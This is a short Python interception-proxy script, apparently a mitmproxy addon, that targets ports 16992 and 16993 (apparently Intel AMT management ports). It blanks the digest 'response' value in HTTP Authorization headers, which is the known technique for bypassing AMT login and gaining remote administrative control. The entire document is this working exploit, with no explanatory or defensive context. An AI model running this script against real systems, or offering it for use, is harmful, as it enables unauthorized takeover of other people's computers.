import sys
import re


def start():
    return BlankAuthResponse()


class BlankAuthResponse:

    RESPONSE_RE = re.compile('(response=".*?")', flags=re.DOTALL)

    def request(self, flow):
        if flow.request.port in (16992, 16993):
            if 'Authorization' in flow.request.headers:
                flow.request.headers['Authorization'] = \
                    self.RESPONSE_RE.sub('response=""', flow.request.headers['Authorization'])